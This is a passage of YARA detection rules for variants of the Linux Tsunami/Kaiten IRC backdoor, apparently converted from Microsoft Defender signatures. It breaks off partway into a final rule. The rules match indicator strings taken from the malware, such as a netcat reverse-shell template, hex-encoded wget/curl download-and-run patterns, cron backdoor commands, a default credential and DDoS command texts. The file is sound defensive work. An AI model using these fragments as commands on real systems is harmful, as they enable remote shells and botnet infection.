rule Backdoor_Linux_Tsunami_A_2147655240_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Tsunami.gen!A"
        threat_id = "2147655240"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Tsunami"
        severity = "Critical"
        info = "gen: malware that is detected using a generic signature"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "50"
        strings_accuracy = "High"
    strings:
        $x_40_1 = "User-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)" ascii //weight: 40
        $x_40_2 = "User-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.6.16-3 i686)" ascii //weight: 40
        $x_10_3 = {54 53 55 4e 41 4d 49 00 50 41 4e 00}  //weight: 10, accuracy: High
        $x_10_4 = {55 44 50 00 50 41 4e 00 54 53 55 4e 41 4d 49 00}  //weight: 10, accuracy: High
        $x_10_5 = {55 44 50 00 44 4f 53 00 54 53 55 4e 41 4d 49 00}  //weight: 10, accuracy: High
        $x_10_6 = {55 4e 4b 4e 4f 57 4e 00 55 44 50 00 53 59 4e 46 4c 4f 4f 44 00}  //weight: 10, accuracy: High
        $x_10_7 = {52 41 4e 44 4f 4d 46 4c 4f 4f 44 00 4e 53 41 43 4b 46 4c 4f 4f 44 00}  //weight: 10, accuracy: High
        $x_10_8 = {55 44 50 00 53 59 4e 00 4d 52 41 00 58 39 53 59 4e 00}  //weight: 10, accuracy: High
        $x_10_9 = {55 44 50 00 53 59 4e 00 4d 52 41 00 55 44 4f 35 33 00}  //weight: 10, accuracy: High
        $x_10_10 = {46 49 4e 00 50 53 48 00 41 43 4b 00 4e 53 41 43 4b 00}  //weight: 10, accuracy: High
        $x_5_11 = {44 49 53 41 42 4c 45 00 45 4e 41 42 4c 45 00 4b 49 4c 4c 00 47 45 54 00 56 45 52 53 49 4f 4e 00 4b 49 4c 4c 41 4c 4c 00}  //weight: 5, accuracy: High
        $x_5_12 = {48 45 4c 50 00 4b 49 4c 4c 41 4c 4c 00 56 45 52 53 49 4f 4e 00 47 45 54 00 4b 49 4c 4c 00 45 4e 41 42 4c 45 00 44 49 53 41 42 4c 45 00}  //weight: 5, accuracy: High
        $x_5_13 = {56 45 52 53 49 4f 4e 00 47 45 54 00 4b 49 4c 4c 00 00 00 00 45 4e 41 42 4c 45 00 00 44 49 53 41 42 4c 45 00}  //weight: 5, accuracy: High
        $x_5_14 = {56 45 52 53 49 4f 4e 00 4b 49 4c 4c 41 4c 4c 00 48 45 4c 50 00}  //weight: 5, accuracy: High
        $x_5_15 = {47 45 54 00 56 45 52 53 49 4f 4e 00 4b 49 4c 4c 41 4c 4c 00 49 52 43 20 00}  //weight: 5, accuracy: High
        $x_1_16 = {4e 4f 54 49 43 45 20 25 73 20 3a 4b 61 69 74 65 6e 20 77 61 20 67 6f 72 61 6b 75 0a 00}  //weight: 1, accuracy: High
        $x_1_17 = {4e 4f 54 49 43 45 20 25 73 20 3a 4b 61 69 74 65 6e 20 62 79 20 50 73 49 6b 30 0a 00}  //weight: 1, accuracy: High
        $x_1_18 = {4e 4f 54 49 43 45 20 25 73 20 3a 4b 2d 73 65 63 75 72 69 74 79 20 76 31 2e 32 30 31 32 20 62 79 20 62 61 6e 64 6f 7a 0a 00}  //weight: 1, accuracy: High
        $x_1_19 = {4e 4f 54 49 43 45 20 25 73 20 3a 4b 69 6c 6c 69 6e 67 20 70 69 64 20 25 64 2e 0a 00}  //weight: 1, accuracy: High
        $x_1_20 = {4e 4f 54 49 43 45 20 25 73 20 3a 78 65 6e 20 76 31 2e 30 0a 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_10_*) and 5 of ($x_5_*) and 5 of ($x_1_*))) or
            ((3 of ($x_10_*) and 3 of ($x_5_*) and 5 of ($x_1_*))) or
            ((3 of ($x_10_*) and 4 of ($x_5_*))) or
            ((4 of ($x_10_*) and 1 of ($x_5_*) and 5 of ($x_1_*))) or
            ((4 of ($x_10_*) and 2 of ($x_5_*))) or
            ((5 of ($x_10_*))) or
            ((1 of ($x_40_*) and 1 of ($x_5_*) and 5 of ($x_1_*))) or
            ((1 of ($x_40_*) and 2 of ($x_5_*))) or
            ((1 of ($x_40_*) and 1 of ($x_10_*))) or
            ((2 of ($x_40_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Tsunami_RB_2147742560_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Tsunami.RB"
        threat_id = "2147742560"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Tsunami"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "busybotnet" ascii //weight: 1
        $x_1_2 = "7ujMko0admin" ascii //weight: 1
        $x_1_3 = "fucker" ascii //weight: 1
        $x_1_4 = "maxided" ascii //weight: 1
        $x_1_5 = "gaybot" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Tsunami_RC_2147747925_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Tsunami.RC!MSR"
        threat_id = "2147747925"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Tsunami"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {77 67 65 74 20 [0-5] 3a 2f 2f [0-3] 2e [0-3] 2e [0-3] 2e [0-3] 2f [0-7] 2f [0-7] 2e 73 68 20 7c 7c 20 63 75 72 6c 20 2d 4f 20 [0-5] 3a 2f 2f [0-3] 2e [0-3] 2e [0-3] 2e [0-3] 2f [0-7] 2f [0-7] 2e 73 68 3b 20 62 75 73 79 62 6f 78}  //weight: 1, accuracy: Low
        $x_1_2 = "MomentumAPIBot" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Tsunami_A_2147753116_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Tsunami.A!MTB"
        threat_id = "2147753116"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Tsunami"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "XTC BOTNET" ascii //weight: 1
        $x_1_2 = "kaiten bot proccesses" ascii //weight: 1
        $x_1_3 = "hellroom" ascii //weight: 1
        $x_1_4 = {77 67 65 74 24 7b 49 46 53 7d 68 74 74 70 3a 2f 2f [0-18] 2f 61 72 6d 37}  //weight: 1, accuracy: Low
        $x_1_5 = "keyPath=%27%0A/bin/sh" ascii //weight: 1
        $x_1_6 = "Self Rep Fucking NeTiS and Thisity" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Tsunami_B_2147759672_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Tsunami.B!MTB"
        threat_id = "2147759672"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Tsunami"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "www.billybobbot.com/crawler" ascii //weight: 1
        $x_1_2 = "www.thesubot.de)" ascii //weight: 1
        $x_1_3 = "/data/crontab/root" ascii //weight: 1
        $x_1_4 = "chmod +x /system/etc/init.d/crond" ascii //weight: 1
        $x_1_5 = "creating chrontab backdoor" ascii //weight: 1
        $x_1_6 = "sendPasswordEmail&user_name=admin" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Tsunami_C_2147763164_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Tsunami.C!MTB"
        threat_id = "2147763164"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Tsunami"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "shit.php?id=> <GET/HEAD/POST> = HTTP flood" ascii //weight: 1
        $x_1_2 = "Another non-spoof udp flooder" ascii //weight: 1
        $x_1_3 = "Downloads a file off the web and saves it onto the hd" ascii //weight: 1
        $x_1_4 = "crontab -l | grep %s | grep -v" ascii //weight: 1
        $x_1_5 = "Killing pid" ascii //weight: 1
        $x_1_6 = "advanced syn flooder that will kill most network" ascii //weight: 1
        $x_1_7 = "Kills all current packeting" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Tsunami_D_2147765461_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Tsunami.D!MTB"
        threat_id = "2147765461"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Tsunami"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "hackmepls" ascii //weight: 1
        $x_1_2 = {48 54 54 50 20 46 6c 6f 6f 64 69 6e 67 20 [0-4] 2f 2f 25 73 3a 25 73 25 73}  //weight: 1, accuracy: Low
        $x_1_3 = "Wtf is this shit: %s" ascii //weight: 1
        $x_1_4 = "STD Flooding" ascii //weight: 1
        $x_1_5 = "RAWUDP Flooding" ascii //weight: 1
        $x_1_6 = "majestic12.co.uk/bot.php?" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Tsunami_E_2147765652_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Tsunami.E!MTB"
        threat_id = "2147765652"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Tsunami"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "NOTICE %s :HTTP Flood Starting on %s" ascii //weight: 1
        $x_1_2 = "%s :RTCP Flood" ascii //weight: 1
        $x_1_3 = "RawUDP Flood Against %s Finished" ascii //weight: 1
        $x_1_4 = "Removed All Spoofs" ascii //weight: 1
        $x_1_5 = "rtcp_attack" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule Backdoor_Linux_Tsunami_F_2147765990_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Tsunami.F!MTB"
        threat_id = "2147765990"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Tsunami"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "[UDP] Attacking" ascii //weight: 1
        $x_1_2 = "PRIVMSG %s :Killing PID " ascii //weight: 1
        $x_2_3 = "+botkill" ascii //weight: 2
        $x_2_4 = "Remote IRC Bot" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            ((2 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Tsunami_G_2147777454_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Tsunami.G!MTB"
        threat_id = "2147777454"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Tsunami"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "irc.teamtnt.red" ascii //weight: 1
        $x_1_2 = "trap '' 1;sh -c 'killall kaiten*;killall kt*;killall .o;sleep 5;trap" ascii //weight: 1
        $x_1_3 = "HackPkg is here! Install a bin" ascii //weight: 1
        $x_1_4 = {49 4e 53 54 41 4c 4c 20 [0-5] 2f 2f 73 65 72 76 65 72 2f 73 63 61 6e 20 66 69 72 73 74}  //weight: 1, accuracy: Low
        $x_1_5 = "Kill telnet, d/l aes backdoor from <server" ascii //weight: 1
        $x_1_6 = "echo IyEvYmluL2Jhc2gKCmV4cG9ydCBMQ19BTEw9QwoKSElTVENPTlRST0w9Imlnbm9yZXNwYWNlJHtISVNUQ09OVFJPTDorOiR" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Tsunami_DS_2147793362_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Tsunami.DS!MTB"
        threat_id = "2147793362"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Tsunami"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "I'm having a problem resolving my host, someone will have to SPOOFS me manually" ascii //weight: 1
        $x_1_2 = "Killing pid %d" ascii //weight: 1
        $x_2_3 = "PRIVMSG %s :>bot +unknown <target> <secs>" ascii //weight: 2
        $x_1_4 = "Remote IRC Bot" ascii //weight: 1
        $x_1_5 = "RAW-UDP Flooding" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 3 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Tsunami_SB_2147808335_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Tsunami.SB!xp"
        threat_id = "2147808335"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Tsunami"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "/etc/rc.d/rc.local" ascii //weight: 2
        $x_2_2 = "GETSPOOFS" ascii //weight: 2
        $x_2_3 = "sh -c 'nohup nc %s -e /bin/sh '" ascii //weight: 2
        $x_2_4 = "Do something like: 169.40" ascii //weight: 2
        $x_2_5 = "NOTICE %s :Removed all spoofs" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Tsunami_Q_2147809146_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Tsunami.Q!MTB"
        threat_id = "2147809146"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Tsunami"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "PRIVMSG %s :attack has been started on %s" ascii //weight: 1
        $x_1_2 = "D D O S - C O M M A N D S" ascii //weight: 1
        $x_1_3 = "do not attack this irc server" ascii //weight: 1
        $x_1_4 = "weapomized malware exploiting multible vulnerabiltys" ascii //weight: 1
        $x_1_5 = {77 67 65 74 20 68 74 74 70 [0-18] 2e 6e 67 72 6f 6b 2e 69 6f 2f}  //weight: 1, accuracy: Low
        $x_1_6 = "polarmalware" ascii //weight: 1
        $x_1_7 = "all most common mirai, qbot, kaiten bot proccesses" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Tsunami_C_2147816103_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Tsunami.C!xp"
        threat_id = "2147816103"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Tsunami"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "KQRIQRLQRLQRAQRLQRL" ascii //weight: 1
        $x_1_2 = "CQRHQREQRCQRKQRSQRUQRM" ascii //weight: 1
        $x_1_3 = "GQREQRTQRSQRPQROQROQRFQRS" ascii //weight: 1
        $x_1_4 = "UQRDQRP" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Tsunami_H_2147816107_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Tsunami.H!xp"
        threat_id = "2147816107"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Tsunami"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "spoofsm" ascii //weight: 2
        $x_1_2 = "getspoofs" ascii //weight: 1
        $x_1_3 = "killall" ascii //weight: 1
        $x_1_4 = "tsunami" ascii //weight: 1
        $x_1_5 = "kaiten.c" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((4 of ($x_1_*))) or
            ((1 of ($x_2_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Tsunami_I_2147817169_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Tsunami.I!xp"
        threat_id = "2147817169"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Tsunami"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "IRC Bot" ascii //weight: 2
        $x_1_2 = "PacketBOT" ascii //weight: 1
        $x_1_3 = "/etc/rc.d/rc.local" ascii //weight: 1
        $x_2_4 = "bot +std <target> <port> <secs>" ascii //weight: 2
        $x_2_5 = "Killing pid %d" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_2_*) and 1 of ($x_1_*))) or
            ((3 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Tsunami_EA_2147817610_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Tsunami.EA"
        threat_id = "2147817610"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Tsunami"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "NOTICE %s :>bot +exec <WGET PERL SCRIPT> <FILENAME>" ascii //weight: 2
        $x_2_2 = "NOTICE %s :%s SOCKSTRESS <ip>:<port> <interface> -t <threads> -s <time> [-p payload] [-d delay]" ascii //weight: 2
        $x_2_3 = "NOTICE %s :HTTP <method> <target> <port> <path> <time> <power> = An extremely powerful HTTP flooder" ascii //weight: 2
        $x_2_4 = "NOTICE %s :SHDISASS <command> = Executes a psuedo-daemonized command" ascii //weight: 2
        $x_1_5 = "(gcc -o %s /tmp/.c; rm -rf /tmp/.c; kill -9 %d; %s &) > /dev/null 2>&1" ascii //weight: 1
        $x_1_6 = "TelnetPayload" ascii //weight: 1
        $x_1_7 = "chmod 775 /var/bin/%s" ascii //weight: 1
        $x_2_8 = "[SYN] Attacking" ascii //weight: 2
        $x_2_9 = "PRIVMSG %s :[TELNET] [-] FAILED TO SEND SHELL PAYLOAD ---> %s:%s:%s" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 2 of ($x_1_*))) or
            ((2 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Tsunami_DQ_2147819337_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Tsunami.DQ!MTB"
        threat_id = "2147819337"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Tsunami"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8b 45 08 8a 00 25 ff 00 00 00 83 ec 0c 50 e8 ?? ?? ?? ?? 83 c4 10 89 c3 8b 45 0c 8a 00 25 ff 00 00 00 83 ec 0c 50 e8 ?? ?? ?? ?? 83 c4 10 39 c3 75 ?? 8b 45 0c 40 8b 55 08 42 83 ec 08 50 52 e8 0d fd ff ff 83 c4 10 85 c0 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Tsunami_DP_2147819338_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Tsunami.DP!MTB"
        threat_id = "2147819338"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Tsunami"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8b 45 08 0f b6 00 0f be c0 89 04 24 e8 ?? ?? ?? ?? 89 c3 8b 45 0c 0f b6 00 0f be c0 89 04 24 e8 ?? ?? ?? ?? 39 c3 75 ?? 8b 45 0c 40 8b 55 08 42 89 44 24 04 89 14 24 e8 ?? ?? ?? ?? 85 c0 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Tsunami_J_2147819505_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Tsunami.J!xp"
        threat_id = "2147819505"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Tsunami"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "HTTPFLOOD" ascii //weight: 1
        $x_1_2 = "TCPFLOOD" ascii //weight: 1
        $x_1_3 = "UDPFLOOD" ascii //weight: 1
        $x_1_4 = "PRIVMSG %s :[%s] {TCPFLOOD} Started sending tcp data to host %s on port %d (%s)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Tsunami_K_2147819537_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Tsunami.K!MTB"
        threat_id = "2147819537"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Tsunami"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {42 11 02 00 21 28 40 00 80 10 02 00 20 00 c3 27 21 10 43 00 44 04 44 8c 2c 00 c2 8f 00}  //weight: 1, accuracy: High
        $x_1_2 = {8f c3 00 24 24 02 00 01 14 62 00 0d 00 00 00 00 a7 c0 00 08 27 c3 00 08 8f c2 00 20 00 00 00 00 90 42 00 00 00 00 00 00 a0 62 00 00 97 c2 00 08 8f c4 00 10 00 00 00 00 00 82 20 21 af c4 00 10 8f c2 00 10 00 00 00 00 00 02 1c 03 8f c4 00 10 00 00 00 00 30 82 ff ff 00 62 18 21 af c3}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Backdoor_Linux_Tsunami_L_2147819538_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Tsunami.L!MTB"
        threat_id = "2147819538"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Tsunami"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {01 1e 4b a0 09 00 e3 61 dc 71 1e 51 10 61 18 21 0f 89 e3 61 dc 71 1f 51 13 62 01 72 e3 61}  //weight: 1, accuracy: High
        $x_1_2 = {04 40 03 99 e0 21 27 bd ff c0 af bf 00 38 af be 00 34 af b0 00 30 03 a0 f0 21 af bc 00 10 af c4 00 40 af c5 00 44 8f c2 00 40 00}  //weight: 1, accuracy: High
        $x_1_3 = {10 00 dc 8f 21 20 40 00 c4 4e 02 3c 4f ec 42 34 18 00 82 00 10 10 00 00 c3 18 02 00 c3 17 04 00 23 18 62 00 34 04 c3}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Backdoor_Linux_Tsunami_K_2147819868_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Tsunami.K!xp"
        threat_id = "2147819868"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Tsunami"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {48 89 e5 48 81 ec f0 00 00 00 89 bd 2c ff ff ff 48 89 95 60 ff ff ff 48 89 8d 68 ff ff ff 4c 89 85 70 ff ff ff 4c 89 8d 78 ff ff ff 0f b6 c0 48 89 85 18 ff ff ff 48 8b 95 18 ff ff ff 48 8d 04 95 00 00 00 00 48 c7 85 18 ff ff ff 47 05 40 00 48 29 85 18 ff ff ff 48 8d 45 ff 48 8b bd 18 ff ff ff}  //weight: 1, accuracy: High
        $x_1_2 = {55 48 89 e5 48 83 ec 30 48 89 7d d8 0f b6 05 c5 bf 10 00 3c 01 75 25 8b 3d 07 e7 10 00 48 8b 55 d8 be f9 9d 40 00 b8 00 00 00 00 e8 ?? ?? ?? ?? c7 45 d4 01 00 00 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Tsunami_L_2147819869_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Tsunami.L!xp"
        threat_id = "2147819869"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Tsunami"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8b 45 08 0f b6 00 0f b6 c0 89 04 24 e8 ?? ?? ?? ?? 89 c3 8b 45 0c 0f b6 00 0f b6 c0 89 04 24 e8 ?? ?? ?? ?? 39 c3 75 18 8b 45 0c 40 8b 55 08 42 89 44 24 04 89 14 24}  //weight: 1, accuracy: Low
        $x_1_2 = {89 c8 f7 d0 48 39 c2 73 0d 8b 45 e4 03 45 0c 0f b6 00 3c 21}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Tsunami_M_2147820418_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Tsunami.M!MTB"
        threat_id = "2147820418"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Tsunami"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {43 10 21 00 02 10 40 00 82 20 23 af c4 04 34 8f c3 04 34 00 00 00 00 30 62 00 ff 24 42}  //weight: 1, accuracy: High
        $x_1_2 = {24 02 00 01 00 62 10 04 00 82 20 25 00 05 10 80 27 c3 00 20 00 43 10 21 ac 44 04 44 24 02 00 3c af c2 04 60}  //weight: 1, accuracy: High
        $x_1_3 = {ff d4 80 1f 00 14 54 00 d9 7e 7c 0a 03 78 54 09 10 3a 38 1f 00 08 7d 29 02 14 39 29 04 44 81 69 00 00 80 1f 00 14 54 09 06}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Backdoor_Linux_Tsunami_M_2147822217_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Tsunami.M!xp"
        threat_id = "2147822217"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Tsunami"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {00 19 00 44 00 12 30 00 00 10 38 00 00 21 28 a7 00 21 38 a0 00 18 80 82 8f 00 00 00 00}  //weight: 1, accuracy: High
        $x_1_2 = {03 80 ef bd 27 7c 10 bf af 78 10 be af 21 f0 a0 03 10 00 bc af 02 00 04 24 01 00 05 24 21 30 00 00 5c 82 99}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Tsunami_N_2147822223_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Tsunami.N!xp"
        threat_id = "2147822223"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Tsunami"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {d0 4d e2 14 00 0b e5 18 10 0b e5 14 30 1b e5 00 30 d3 e5 2c 30 0b e5 2c 30 1b e5}  //weight: 1, accuracy: High
        $x_1_2 = {00 ea 00 30 a0 e3 24 30 0b e5 24 30 1b e5 28 30 0b e5 32}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Tsunami_DR_2147822838_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Tsunami.DR!MTB"
        threat_id = "2147822838"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Tsunami"
        severity = "Critical"
